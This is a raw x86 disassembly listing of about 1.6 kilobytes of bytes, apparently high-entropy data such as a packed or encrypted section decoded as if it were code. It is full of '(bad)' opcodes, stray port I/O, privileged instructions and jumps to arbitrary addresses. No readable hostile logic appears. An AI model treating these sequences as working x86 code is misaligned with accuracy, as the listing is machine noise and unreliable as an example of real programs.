  4226ba:	imul   ebx,DWORD PTR [eax+0x5e],0x17
  4226be:	dec    ecx
  4226bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226c1:	xchg   ebp,eax
  4226c2:	xchg   esi,eax
  4226c3:	push   0x46
  4226c5:	div    BYTE PTR [ecx+ebx*4-0x2a]
  4226c9:	mov    ?,esi
  4226cb:	xor    esi,ebx
  4226cd:	lea    edi,[ebx-0x30]
  4226d0:	shl    DWORD PTR [ebp+0x5a2cea9b],0xd2
  4226d7:	add    dh,ch
  4226d9:	lahf   
  4226da:	shr    DWORD PTR ds:0xb2f2d328,0x0
  4226e1:	je     0x42266b
  4226e3:	push   ebx
  4226e4:	arpl   WORD PTR [eax+ecx*4+0x6466409b],dx
  4226eb:	lods   al,BYTE PTR ds:[esi]
  4226ec:	aad    0x45
  4226ee:	push   es
  4226ef:	(bad)  
  4226f0:	xchg   ecx,eax
  4226f1:	outs   dx,BYTE PTR ds:[esi]
  4226f2:	fnsave [ebp-0x443fa183]
  4226f8:	adc    eax,0xa9385498
  4226fd:	jmp    0x422702
  4226ff:	pop    esp
  422700:	dec    eax
  422701:	bound  esp,QWORD PTR [eax]
  422703:	mov    al,ds:0x220d4229
  422708:	(bad)  
  422709:	mov    dh,0xea
  42270b:	add    BYTE PTR [edx-0x42],0x75
  42270f:	sub    eax,0x22f8ba25
  422714:	mov    dh,0xce
  422716:	fcmovb st,st(7)
  422718:	pop    ebp
  422719:	fnstenv [esi+0x5d6fa255]
  42271f:	sub    DWORD PTR [esi-0x1c],edx
  422722:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422723:	push   ebx
  422724:	xchg   ebx,eax
  422725:	inc    eax
  422726:	rcr    ch,1
  422728:	jl     0x42279c
  42272a:	clc    
  42272b:	(bad)  
  42272c:	dec    ebp
  42272d:	sub    cl,BYTE PTR [edx+0x1a4bdfb7]
  422733:	or     esp,DWORD PTR [edi-0x2a]
  422736:	in     al,dx
  422737:	cmp    DWORD PTR [ebp+edi*4+0x54],esi
  42273b:	out    0x62,eax
  42273d:	xor    DWORD PTR [ecx+edi*1],eax
  422740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422741:	or     al,0x81
  422743:	cmc    
  422744:	or     ah,BYTE PTR [ecx+0x19]
  422747:	pop    ebp
  422748:	add    DWORD PTR [esi-0x66],ebp
  42274b:	xor    al,0x16
  42274d:	(bad)  
  42274e:	and    al,0x54
  422750:	scas   eax,DWORD PTR es:[edi]
  422751:	sub    BYTE PTR [ebx-0x6329dc9f],bh
  422757:	mov    esp,0xe583f7e5
  42275c:	push   ecx
  42275d:	outs   dx,DWORD PTR ds:[esi]
  42275e:	aad    0xc4
  422760:	scas   al,BYTE PTR es:[edi]
  422761:	sub    eax,0xbf22b5d
  422766:	(bad)  
  422767:	test   eax,0xe1974b0d
  42276c:	jbe    0x4226f5
  42276e:	dec    ebp
  42276f:	adc    eax,edx
  422771:	adc    ebp,DWORD PTR [ebp+0x51]
  422774:	mov    al,0x40
  422776:	push   ebx
  422777:	mov    DWORD PTR [ecx+0x49],eax
  42277a:	data16 std 
  42277c:	xor    BYTE PTR [ebx-0x39],bh
  42277f:	fs popf 
  422781:	clc    
  422782:	jno    0x422711
  422784:	add    BYTE PTR [edi+0xb49cdac],ah
  42278a:	iret   
  42278b:	call   0x6ca68d9f
  422790:	stos   BYTE PTR es:[edi],al
  422791:	inc    esi
  422792:	test   al,0x4a
  422794:	pop    edi
  422795:	inc    ebx
  422796:	push   ebx
  422797:	outs   dx,DWORD PTR ds:[esi]
  422798:	and    al,0x64
  42279a:	(bad)  
  42279b:	pop    ecx
  42279c:	sbb    al,0xe
  42279e:	in     eax,0x4a
  4227a0:	scas   eax,DWORD PTR es:[edi]
  4227a1:	aas    
  4227a2:	pop    es
  4227a3:	add    DWORD PTR [edx],ebp
  4227a5:	lds    ebp,FWORD PTR [edi-0xd5ec682]
  4227ab:	ret    0x1ae7
  4227ae:	stos   DWORD PTR es:[edi],eax
  4227af:	test   eax,0x41cde2e4
  4227b4:	sub    al,cl
  4227b6:	jnp    0x4227d3
  4227b8:	mov    ebp,0x202800
  4227bd:	mov    al,ds:0xb22b91a2
  4227c2:	mov    edx,0xcc746d5e
  4227c7:	sub    esp,DWORD PTR [edx+0x42ebb308]
  4227cd:	adc    esi,ebx
  4227cf:	in     eax,0xed
  4227d1:	or     eax,0xe8eeb2f3
  4227d6:	ds dec edi
  4227d8:	push   eax
  4227d9:	jmp    0x4065fa44
  4227de:	or     DWORD PTR [edx],ecx
  4227e0:	ret    
  4227e1:	and    BYTE PTR [ebx],dh
  4227e3:	cmp    edi,DWORD PTR [esi+0x6e79ee3d]
  4227e9:	push   ebx
  4227ea:	int3   
  4227eb:	dec    eax
  4227ec:	or     esi,DWORD PTR [ebx+0x18a76290]
  4227f2:	inc    esp
  4227f3:	xor    eax,0x9b0dc355
  4227f8:	mov    ecx,eax
  4227fa:	repnz or DWORD PTR ds:0x5e9f804e,eax
  422801:	mov    cl,0x2b
  422803:	jns    0x4227c9
  422805:	fisubr WORD PTR [ebx-0x6e]
  422808:	push   cs
  422809:	sbb    bl,BYTE PTR [eax+0x62]
  42280c:	add    bh,ah
  42280e:	mov    ecx,0xa541de1a
  422813:	dec    ecx
  422814:	popf   
  422815:	jecxz  0x42285a
  422817:	sub    ebx,edx
  422819:	pop    ds
  42281a:	dec    esp
  42281b:	jecxz  0x4227f7
  42281d:	je     0x42284f
  42281f:	sbb    DWORD PTR [eax+0xa43bde0],edi
  422825:	mov    edx,0x70e2b16a
  42282a:	popf   
  42282b:	mov    edi,0xa1339160
  422830:	xor    al,dh
  422832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422833:	jno    0x422824
  422835:	std    
  422836:	(bad)  
  422838:	rcl    BYTE PTR [edi-0x60],0xe1
  42283c:	mov    al,0xd0
  42283e:	into   
  42283f:	outs   dx,BYTE PTR ds:[esi]
  422840:	adc    BYTE PTR [ecx-0x4565403e],ch
  422846:	fdiv   DWORD PTR [esi-0x66b11f30]
  42284c:	pop    ss
  42284d:	add    BYTE PTR [ecx],dh
  42284f:	inc    esi
  422850:	jbe    0x422837
  422852:	popa   
  422853:	sub    ebx,edi
  422855:	mov    dh,0xd5
  422857:	int    0x55
  422859:	call   FWORD PTR [eax]
  42285b:	jb     0x422823
  42285d:	xchg   BYTE PTR [edx],bh
  42285f:	imul   edx,DWORD PTR [esi-0x5f],0xfffffffe
  422863:	xchg   esi,eax
  422864:	jp     0x42285c
  422866:	(bad)  
  422867:	shl    bl,1
  422869:	sub    al,0x74
  42286b:	test   DWORD PTR [ecx+0x70bebf80],ebx
  422871:	js     0x422819
  422873:	or     eax,0x3e1f387
  422878:	cld    
  422879:	dec    ecx
  42287a:	aam    0x22
  42287c:	lds    ebp,FWORD PTR [ebp-0x24a7bca4]
  422882:	pop    esp
  422883:	retf   0x892d
  422886:	cmp    DWORD PTR [ebx],ebx
  422888:	and    DWORD PTR [ecx-0x65f2ad59],esi
  42288e:	repnz (bad) 
  422890:	push   cs
  422891:	lods   eax,DWORD PTR ds:[esi]
  422892:	jbe    0x422885
  422894:	pop    ds
  422895:	scas   ax,WORD PTR es:[edi]
  422897:	repnz test DWORD PTR [ecx],ebx
  42289a:	out    dx,al
  42289b:	(bad)  
  42289c:	retf   0x1c73
  42289f:	(bad)  
  4228a1:	(bad)  
  4228a2:	mov    bl,0x55
  4228a4:	stc    
  4228a5:	mov    esi,0x7feae75f
  4228aa:	mov    eax,0xaf1b9bae
  4228af:	in     al,0x86
  4228b1:	nop
  4228b2:	dec    esp
  4228b3:	jg     0x42285f
  4228b5:	mov    al,ds:0x1649df02
  4228ba:	ins    DWORD PTR es:[edi],dx
  4228bb:	xor    eax,0xbff69c1d
  4228c0:	in     al,0x86
  4228c2:	sbb    dl,BYTE PTR [edx]
  4228c4:	dec    edx
  4228c5:	sbb    DWORD PTR [ebp-0x25],esp
  4228c8:	xor    eax,0x26203335
  4228cd:	(bad)  
  4228ce:	bound  ecx,QWORD PTR [edi]
  4228d0:	fcmovnb st,st(2)
  4228d2:	out    dx,al
  4228d3:	ins    DWORD PTR es:[edi],dx
  4228d4:	cmp    al,0x49
  4228d6:	sub    BYTE PTR [edi+0x6a],bh
  4228d9:	popf   
  4228da:	(bad)  
  4228db:	inc    cx
  4228dd:	fwait
  4228de:	sub    BYTE PTR [ebx],ch
  4228e0:	adc    esp,DWORD PTR [ebx+0x237d2283]
  4228e6:	dec    eax
  4228e7:	frstor [edi]
  4228e9:	jp     0x422931
  4228eb:	inc    esp
  4228ec:	mov    cl,0x33
  4228ee:	mov    ebx,0x94dbca6c
  4228f3:	mov    bh,0xbd
  4228f5:	sbb    dh,BYTE PTR [edx-0xf]
  4228f8:	test   eax,0xd8d45b9d
  4228fd:	mov    ebp,0x1546d1fd
  422902:	cli    
  422903:	inc    ebp
  422904:	xor    eax,0xe1679685
  422909:	in     al,dx
  42290a:	cdq    
  42290b:	adc    al,0x90
  42290d:	adc    DWORD PTR [eax+0x66458536],edx
  422913:	and    al,0xa4
  422915:	mov    bl,0x94
  422917:	loopne 0x42297d
  422919:	push   edx
  42291a:	add    ecx,0xb5fae368
  422920:	dec    ecx
  422921:	and    bp,0x61
  422925:	clc    
  422926:	retf   0x385a
  422929:	call   FWORD PTR [edx-0x4c612fc4]
  42292f:	stos   BYTE PTR es:[edi],al
  422930:	js     0x42290a
  422932:	dec    BYTE PTR [esi-0x35ffb29b]
  422938:	push   ebx
  422939:	mov    ch,0x80
  42293b:	ret    
  42293c:	dec    ecx
  42293d:	and    cl,BYTE PTR [edi-0x1797a8bf]
  422943:	imul   ecx,DWORD PTR [eax+0x6ae7babe],0x31
  42294a:	out    0x2a,eax
  42294c:	ret    0xe48
  42294f:	enter  0xedea,0x58
  422953:	loop   0x4229c4
  422955:	in     eax,dx
  422956:	fdivr  DWORD PTR [eax+0x11fd80cb]
  42295c:	xor    dx,WORD PTR [esi+0x5e]
  422960:	mov    esi,0xdd8c0f0b
  422965:	jbe    0x4229bf
  422967:	xchg   BYTE PTR [edx+0x6e5d3101],dh
  42296d:	cmp    al,0x5a
  42296f:	jns    0x422963
  422971:	mov    ds:0xc240fa1d,al
  422976:	call   0xb58e4b37
  42297b:	jg     0x4229d8
  42297d:	repnz fisttp WORD PTR [ebx]
  422980:	into   
  422981:	sub    cl,bl
  422983:	aam    0x3a
  422985:	out    0x14,al
  422987:	scas   al,BYTE PTR es:[edi]
  422988:	xchg   ecx,eax
  422989:	lds    esp,FWORD PTR [edi+0x64]
  42298c:	out    0x36,eax
  42298e:	sub    edi,DWORD PTR [eax]
  422990:	cmc    
  422991:	popf   
  422992:	je     0x42291f
  422994:	out    0x34,al
  422996:	push   ebx
  422997:	sar    DWORD PTR [ecx+0xa],cl
  42299a:	nop
  42299b:	seta   dl
  42299e:	in     eax,dx
  42299f:	int3   
  4229a0:	sbb    BYTE PTR ds:0x4b8534af,ch
  4229a6:	mov    ch,0xb
  4229a8:	pop    edx
  4229a9:	sbb    eax,DWORD PTR [edi]
  4229ab:	inc    esi
  4229ac:	leave  
  4229ad:	inc    ecx
  4229ae:	daa    
  4229af:	sub    ch,BYTE PTR [edx]
  4229b1:	jp     0x422a19
  4229b3:	aad    0xa8
  4229b5:	push   ss
  4229b6:	push   eax
  4229b7:	mov    eax,0x49ce29c3
  4229bc:	loope  0x422a35
  4229be:	ret    
  4229bf:	out    dx,eax
  4229c0:	call   0xa762:0x1dcc6296
  4229c7:	out    dx,al
  4229c8:	pop    ds
  4229c9:	movaps xmm4,XMMWORD PTR [ebp+0x12]
  4229cd:	arpl   cx,bp
  4229cf:	int3   
  4229d0:	fcom   QWORD PTR [ebx]
  4229d2:	mov    al,dl
  4229d4:	into   
  4229d5:	dec    eax
  4229d6:	daa    
  4229d7:	stos   BYTE PTR es:[edi],al
  4229d8:	repnz adc al,0x99
  4229db:	push   ebx
  4229dc:	in     eax,dx
  4229dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229de:	add    BYTE PTR [eax+0x29],dh
  4229e1:	cmp    ch,bh
  4229e3:	xor    edi,DWORD PTR [edi]
  4229e5:	inc    ebp
  4229e6:	and    DWORD PTR [eax+esi*1],esi
  4229e9:	les    esi,FWORD PTR [eax]
  4229eb:	in     al,0x90
  4229ed:	test   BYTE PTR [ebp+0x51896c20],ch
  4229f3:	xor    DWORD PTR ds:0x5972c3fc,esp
  4229f9:	mov    DWORD PTR [edx-0x51],esi
  4229fc:	push   ss
  4229fd:	and    eax,DWORD PTR [eax*1+0x2c89ada]
  422a04:	jne    0x4229c3
  422a06:	push   ebx
  422a07:	nop
  422a08:	mov    edi,0xab1260ec
  422a0d:	xor    bl,BYTE PTR [edi+ebx*1-0x77dc6d4]
  422a14:	xchg   DWORD PTR [ecx],esi
  422a16:	adc    BYTE PTR [esi],ch
  422a18:	clc    
  422a19:	enter  0xae22,0x1
  422a1d:	jge    0x4229c4
  422a1f:	imul   esp,edx,0xc
  422a22:	mov    eax,fs
  422a24:	and    dh,cl
  422a26:	sub    eax,0xfa30c10d
  422a2b:	out    dx,al
  422a2c:	(bad)  
  422a2d:	mov    al,ds:0x2b4668fe
  422a32:	leave  
  422a33:	inc    esp
  422a34:	sbb    esp,DWORD PTR [edi+0x5db3e216]
  422a3a:	pop    DWORD PTR [edx+edx*4-0x36cdf906]
  422a41:	adc    cl,bh
  422a43:	sti    
  422a44:	sahf   
  422a45:	dec    esp
  422a46:	cmc    
  422a47:	test   BYTE PTR [esi-0x32d8ee6],cl
  422a4d:	mov    ds:0x5add66f8,al
  422a52:	jns    0x422a51
  422a54:	ficomp DWORD PTR [ebx+ebp*8-0x17]
  422a58:	mov    ch,0x60
  422a5a:	stos   BYTE PTR es:[edi],al
  422a5b:	fwait
  422a5c:	mov    BYTE PTR [eax],dl
  422a5e:	cmc    
  422a5f:	pop    ds
  422a60:	push   edi
  422a61:	mov    bh,0xdd
  422a63:	out    0xe6,al
  422a65:	ds push ebx
  422a67:	and    BYTE PTR [edx+eax*4+0x2a18b3d1],ah
  422a6e:	add    edx,DWORD PTR [edx-0x42]
  422a71:	bound  ebx,QWORD PTR [edi-0x4ac0a9be]
  422a77:	mov    cl,0x89
  422a79:	int3   
  422a7a:	lds    esp,FWORD PTR [ecx+ebp*4-0x5165541]
  422a81:	jge    0x422ad3
  422a83:	aad    0xd3
  422a85:	xor    eax,0xe105029a
  422a8a:	stos   DWORD PTR es:[edi],eax
  422a8b:	fisttp WORD PTR [esi+esi*4]
  422a8e:	sahf   
  422a8f:	or     eax,0xc1f81310
  422a94:	inc    eax
  422a95:	outs   dx,BYTE PTR ds:[esi]
  422a96:	aaa    
  422a97:	imul   ebx,esi,0x30930e58
  422a9d:	lds    edx,FWORD PTR [edi-0x46ac1e0f]
  422aa3:	popf   
  422aa4:	push   es
  422aa5:	popf   
  422aa6:	les    si,DWORD PTR [eax+ebp*1]
  422aaa:	int3   
  422aab:	(bad)  
  422aac:	pop    esp
  422aad:	jecxz  0x422a6c
  422aaf:	scas   al,BYTE PTR es:[edi]
  422ab0:	adc    eax,0x8e80a1a5
  422ab5:	out    0xa5,eax
  422ab7:	cwde   
  422ab8:	adc    dl,cl
  422aba:	fcom   QWORD PTR [esi-0x6a2115bb]
  422ac0:	xchg   edi,eax
  422ac1:	push   0x1ed0ce9
  422ac6:	fild   DWORD PTR [eax-0xb]
  422ac9:	ret    0xe9ec
  422acc:	scas   al,BYTE PTR es:[edi]
  422acd:	push   es
  422ace:	enter  0xde83,0xec
  422ad2:	cdq    
  422ad3:	jnp    0x422afe
  422ad5:	stos   DWORD PTR es:[edi],eax
  422ad6:	jmp    0x93e5692
  422adb:	stc    
  422adc:	sub    dl,bh
  422ade:	pop    eax
  422adf:	int    0x15
  422ae1:	xchg   ebp,eax
  422ae2:	jo     0x422b45
  422ae4:	and    eax,DWORD PTR [ecx-0x3150715]
  422aea:	stos   BYTE PTR es:[edi],al
  422aeb:	scas   al,BYTE PTR es:[edi]
  422aec:	clc    
  422aed:	dec    ebx
  422aee:	sti    
  422aef:	(bad)  
  422af0:	jo     0x422b28
  422af2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422af3:	aaa    
  422af4:	repnz cmp cl,BYTE PTR [eax]
  422af7:	and    BYTE PTR [ecx],ah
  422af9:	cld    
  422afa:	or     eax,0x8e4fec85
  422aff:	fdiv   QWORD PTR [edx-0x25d0c4f4]
  422b05:	dec    ebx
  422b06:	push   0xffffffe8
  422b08:	test   al,0x90
  422b0a:	or     eax,DWORD PTR [edx-0x3f4733bc]
  422b10:	gs inc ecx
  422b12:	pop    esi
  422b13:	iret   
  422b14:	inc    ebp
  422b15:	adc    BYTE PTR [ecx+0x6376443b],ch
  422b1b:	sti    
  422b1c:	(bad)  [edx-0x1d125200]
  422b22:	sub    BYTE PTR [eax+0x65],bl
  422b25:	xchg   ebx,eax
  422b26:	gs jno 0x422b10
  422b29:	fild   WORD PTR [ecx+0x62287634]
  422b2f:	lahf   
  422b30:	mov    ebp,0x4d1dba82
  422b35:	inc    eax
  422b36:	test   al,0x34
  422b38:	je     0x422b73
  422b3a:	mov    eax,0xebb220f6
  422b3f:	retf   0x5d31
  422b42:	stos   DWORD PTR es:[edi],eax
  422b43:	adc    ebx,0xffffffcc
  422b46:	dec    esp
  422b47:	mov    ?,ecx
  422b49:	int3   
  422b4a:	mov    esi,0x47d5c57a
  422b4f:	fnstsw WORD PTR [eax+0x1971bda]
  422b55:	imul   edi,DWORD PTR ds:0x2b4d3005,0x6246a3c6
  422b5f:	jo     0x422b1a
  422b61:	call   0x5f92140b
  422b66:	add    ah,BYTE PTR [edi+0x198bb690]
  422b6c:	sbb    BYTE PTR ds:0x2562797a,al
  422b72:	cs call 0x5367:0x663c7036
  422b7a:	or     BYTE PTR [ebx-0x39],ch
  422b7d:	xchg   esi,eax
  422b7e:	inc    eax
  422b7f:	sub    al,0xb4
  422b81:	imul   eax
  422b83:	stc    
  422b84:	stos   BYTE PTR es:[edi],al
  422b85:	loopne 0x422b31
  422b87:	out    0x15,al
  422b89:	adc    ch,dh
  422b8b:	mov    BYTE PTR [ecx-0x4ba0a561],cl
  422b91:	and    esi,DWORD PTR [edx+0x5ded6df7]
  422b97:	call   0xb742:0x15e8565d
  422b9e:	call   0x46fb538b
  422ba3:	shl    BYTE PTR [ebp-0x1e],cl
  422ba6:	sar    DWORD PTR [ebp+edx*2-0xb13b8fa],cl
  422bad:	dec    edx
  422bae:	add    dl,BYTE PTR [ecx]
  422bb0:	push   ecx
  422bb1:	sub    DWORD PTR [esp+eax*2],edx
  422bb4:	fldcw  WORD PTR [edx+0x7b29a6ac]
  422bba:	stc    
  422bbb:	xor    edx,DWORD PTR [esi]
  422bbd:	clc    
  422bbe:	sbb    eax,0x3b010051
  422bc3:	ja     0x422bbb
  422bc5:	or     ah,0x93
  422bc8:	out    dx,al
  422bc9:	add    esp,DWORD PTR [esi+eiz*4+0x60b15f21]
  422bd0:	sbb    ecx,DWORD PTR [ecx+0x31f23c0d]
  422bd6:	xchg   ebp,eax
  422bd7:	xor    ecx,DWORD PTR [ebx-0x45]
  422bda:	add    ebx,DWORD PTR [ebp-0x2c]
  422bdd:	test   DWORD PTR [ecx+eiz*2-0xc],eax
  422be1:	cmp    al,0xd1
  422be3:	xor    eax,DWORD PTR [ebx+ecx*1]
  422be6:	dec    ecx
  422be7:	lea    edx,[eax-0x15f91bf]
  422bed:	adc    BYTE PTR [esi+0x6e4e8253],0x2e
  422bf4:	jb     0x422c55
  422bf6:	jle    0x422ba5
  422bf8:	outs   dx,BYTE PTR ds:[esi]
  422bf9:	and    dl,BYTE PTR [ecx+0x7c]
  422bfc:	mov    DWORD PTR [edx+0x22],esp
  422bff:	ror    BYTE PTR [ebp+0x4bc7fefe],0x4c
  422c06:	jne    0x422bbe
  422c08:	sbb    DWORD PTR [esi-0x1085c277],ebx
  422c0e:	jbe    0x422be5
  422c10:	push   0xffffffe1
  422c12:	and    DWORD PTR [esi-0x79c2cdfb],eax
  422c18:	sbb    BYTE PTR [ebp+eiz*2+0x7e54ba53],bl
  422c1f:	iret   
  422c20:	sub    DWORD PTR [edi],eax
  422c22:	test   al,0xb6
  422c24:	cmp    esp,DWORD PTR [esi]
  422c26:	jle    0x422c67
  422c28:	cmp    al,0xa1
  422c2a:	sub    DWORD PTR [edx-0x35d752f8],edx
  422c30:	not    bh
  422c32:	aad    0x6
  422c34:	in     al,0xf7
  422c36:	data16 mov BYTE PTR [ebp+edi*8-0x17],bh
  422c3b:	mov    ecx,0x78c4d1f3
  422c40:	(bad)  
  422c41:	xchg   edx,eax
  422c42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c43:	and    al,BYTE PTR [esi+0x54f9f399]
  422c49:	pop    esp
  422c4a:	push   0xffffff81
  422c4c:	inc    eax
  422c4d:	fidivr DWORD PTR [ecx-0xd]
  422c50:	rcl    DWORD PTR [ebx+eax*2+0xb],cl
  422c54:	cs add al,0xa9
  422c57:	push   ecx
  422c58:	rcr    BYTE PTR [esi-0x753283f4],cl
  422c5e:	and    DWORD PTR [esi],ebp
  422c60:	jb     0x422c8c
  422c62:	xor    al,0xb1
  422c64:	out    dx,al
  422c65:	pop    eax
  422c66:	in     al,0xb5
  422c68:	adc    DWORD PTR [edi+0x609fdf6a],esi
  422c6e:	jecxz  0x422cbe
  422c70:	div    BYTE PTR [eax-0x6a]
  422c73:	inc    esp
  422c74:	fs loopne 0x422c8c
  422c77:	add    edi,edi
  422c79:	ins    BYTE PTR es:[edi],dx
  422c7a:	xchg   ebx,eax
  422c7b:	aad    0x95
  422c7d:	add    al,0x12
  422c7f:	push   0x19
  422c81:	inc    esi
  422c82:	mov    WORD PTR [edi],gs
  422c84:	inc    esi
  422c85:	loope  0x422ca3
  422c87:	fidiv  DWORD PTR [edi-0x17a75d12]
  422c8d:	mov    esi,DWORD PTR [eax]
  422c8f:	adc    eax,0xd7e85a17
  422c94:	jp     0x422c3c
  422c96:	and    al,0x5d
  422c98:	fstp   DWORD PTR es:[esi]
  422c9b:	mov    al,cl
  422c9d:	cmp    ch,al
  422c9f:	inc    eax
  422ca0:	and    esp,DWORD PTR [ebp-0x2a]
  422ca3:	lods   al,BYTE PTR ds:[esi]
  422ca4:	js     0x422d14
  422ca6:	jp     0x422c9f
  422ca8:	inc    esi
  422ca9:	pop    ds
  422caa:	outs   dx,BYTE PTR ds:[esi]
  422cab:	and    al,0x13
  422cad:	data16 ficom DWORD PTR [esp+ebx*1-0x1a501e95]
  422cb5:	or     al,0x20
  422cb7:	inc    edi
  422cb8:	xlat   BYTE PTR ds:[ebx]
  422cb9:	out    dx,al
  422cba:	into   
  422cbb:	sar    DWORD PTR [ebx+edi*2+0x778b1836],cl
  422cc2:	pop    edx
  422cc3:	fcmove st,st(7)
  422cc5:	xor    cl,BYTE PTR [edx]
  422cc7:	int    0xe0
  422cc9:	mov    dl,0x96
  422ccb:	stc    
  422ccc:	push   0x38c3f9
  422cd1:	lock or DWORD PTR [eax-0x1b],edi
  422cd5:	outs   dx,BYTE PTR ds:[esi]
  422cd6:	fmul   QWORD PTR [eax-0x1]
  422cd9:	(bad)  
  422cda:	add    bl,al
  422cdc:	pop    ecx
  422cdd:	loope  0x422cc2
  422cdf:	xor    BYTE PTR [ecx-0x76],0x9f
  422ce3:	out    0x7,eax
  422ce5:	leave  
  422ce6:	sbb    DWORD PTR [eax],esp
  422ce8:	addr16 push ebx
  422cea:	pop    eax
  422ceb:	mov    ebp,0x18ac63a0
  422cf0:	cmp    al,bl
  422cf2:	lahf   
  422cf3:	add    BYTE PTR [ebx],al
  422cf5:	pop    esp
  422cf6:	lock fsubr QWORD PTR [esi+0x29bb7839]
  422cfd:	in     al,0x15
  422cff:	mov    ebp,0xd4109887
  422d04:	sbb    BYTE PTR fs:[edi+eiz*4-0x3b],0xc8
  422d0a:	adc    DWORD PTR [ebp+0x2a],esp
  422d0d:	ds xor eax,0x8dc39967
  422d13:	or     BYTE PTR [ecx+0x58d8e608],al
  422d19:	imul   BYTE PTR [esi-0x79]
  422d1c:	enter  0xa5ca,0x6f
  422d20:	xor    ecx,DWORD PTR [edx+0x56]
  422d23:	cmp    eax,0xeb7427be
  422d28:	or     esi,DWORD PTR [esi+0x2558f6d8]
  422d2e:	sahf   
  422d2f:	das    
  422d30:	fcomp  DWORD PTR [esi]
  422d32:	int3   
  422d33:	xor    eax,0x29f8f67d
  422d38:	out    0xd6,eax
  422d3a:	js     0x422cec
  422d3c:	mov    cl,0xd4
  422d3e:	jnp    0x422d3f
  422d40:	cmp    al,0xeb
  422d42:	mov    eax,0xe2badf2f
  422d47:	pop    es
  422d48:	pop    ebx
  422d49:	jne    0x422d73
  422d4b:	xor    al,0x49
  422d4d:	add    DWORD PTR [eax+0x1abfc94a],ecx
  422d53:	adc    bh,BYTE PTR [eax+edx*4]
  422d56:	stos   DWORD PTR es:[edi],eax
  422d57:	mov    ds:0x19e7c4a0,eax
  422d5c:	xlat   BYTE PTR ds:[ebx]
  422d5d:	or     al,0xaf
  422d5f:	(bad)  
  422d61:	cli    
  422d62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d63:	add    ecx,ebp
  422d65:	xchg   ebx,eax
  422d66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d67:	pop    ss
  422d68:	push   ecx
  422d69:	or     eax,0x6f983f59
  422d6e:	ins    BYTE PTR es:[edi],dx
  422d6f:	loope  0x422de3
  422d71:	iret   
  422d72:	pop    ss
  422d73:	stos   BYTE PTR es:[edi],al
  422d74:	repz cmc 
  422d76:	aad    0x77
  422d78:	adc    cl,BYTE PTR [edx-0x13bcccd1]
  422d7e:	push   esp
  422d7f:	mov    bh,0xef
  422d81:	or     dl,al
  422d83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d84:	push   edx
  422d85:	xchg   edi,eax
  422d86:	fistp  QWORD PTR ss:[esi+0x1b]
  422d8a:	outs   dx,DWORD PTR ds:[esi]
  422d8b:	pop    es
  422d8c:	not    BYTE PTR [ebp+0x28]
  422d8f:	stos   BYTE PTR es:[edi],al
  422d90:	xchg   edi,eax
  422d91:	adc    DWORD PTR [ebx+esi*4-0x6d9870e],eax
  422d98:	push   ecx
  422d99:	aam    0x5a
  422d9b:	xlat   BYTE PTR ds:[ebx]
  422d9c:	sbb    ch,BYTE PTR [esi]
  422d9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d9f:	lods   al,BYTE PTR ds:[si]
  422da1:	das    
  422da2:	mov    DWORD PTR [edi],ecx
  422da4:	mov    dl,0x90
  422da6:	push   esi
  422da7:	setp   BYTE PTR [esi+eiz*1+0x3e290748]
  422daf:	inc    ebp
  422db0:	pop    edi
  422db1:	icebp  
  422db2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422db3:	sub    al,0xc1
  422db5:	ret    
  422db6:	fnstenv [eax+0xc]
  422db9:	xchg   ebp,eax
  422dba:	sub    DWORD PTR [edx+ebp*4],ecx
  422dbd:	or     eax,0x98c13fab
  422dc2:	inc    eax
  422dc3:	jmp    FWORD PTR [edx+0x382d8935]
  422dc9:	popf   
  422dca:	retf   
  422dcb:	adc    BYTE PTR [esp+ebp*2],bl
  422dce:	add    DWORD PTR [eax],ecx
  422dd0:	cwde   
  422dd1:	dec    edi
  422dd2:	addr16 jp 0x422d5f
  422dd5:	mov    eax,ds:0x97d73e75
  422dda:	mov    esp,0xd2cb9f31
  422ddf:	loop   0x422d9e
  422de1:	mov    al,0xc8
  422de3:	xor    al,0x5c
  422de5:	jbe    0x422dc9
  422de7:	and    cl,0x1c
  422dea:	mov    dl,0x6e
  422dec:	inc    esp
  422ded:	sbb    DWORD PTR [esi-0x38],esi
  422df0:	hlt    
  422df1:	mov    esi,0xa7292f4b
  422df6:	mov    BYTE PTR [ebx-0x64],bh
  422df9:	dec    ebp
  422dfa:	jmp    0x9f72:0x9c4feeb9
  422e01:	pop    eax
  422e02:	pop    edx
  422e03:	push   esi
  422e04:	in     al,0xf3
  422e06:	mov    ds:0x6c522309,eax
  422e0b:	mov    BYTE PTR [edi],ah
  422e0d:	aad    0x9b
  422e0f:	jne    0x422d91
  422e11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e12:	pop    ss
  422e13:	outs   dx,DWORD PTR ds:[esi]
  422e14:	and    dh,BYTE PTR [ebp+0x3cb8e91f]
  422e1a:	push   ecx
  422e1b:	or     al,0x9d
  422e1d:	mov    dh,0x9d
  422e1f:	dec    edx
  422e20:	mov    ebx,0xe6a0d71a
  422e25:	test   al,0x69
  422e27:	loopne 0x422e0f
  422e29:	adc    al,BYTE PTR [esi-0x24]
  422e2c:	jp     0x422e2f
  422e2e:	loop   0x422dc7
  422e30:	mov    BYTE PTR [edx],bh
  422e32:	out    0x88,eax
  422e34:	or     eax,0xebb1dd95
  422e39:	out    0x89,al
  422e3b:	hlt    
  422e3c:	(bad)  
  422e3e:	das    
  422e3f:	jmp    0x882cc0e6
  422e44:	popa   
  422e45:	push   edx
  422e46:	mov    DWORD PTR [ebx+ebx*4-0x154bee20],ebp
  422e4d:	jmp    0x122bb212
  422e52:	fistp  WORD PTR ds:0x971d7528
  422e58:	jns    0x422ec0
  422e5a:	lahf   
  422e5b:	inc    edx
  422e5c:	nop
  422e5d:	out    0xbe,eax
  422e5f:	push   edx
  422e60:	push   ds
  422e61:	mov    DWORD PTR [ebx-0x407a3f90],esp
  422e67:	retf   0xf4d6
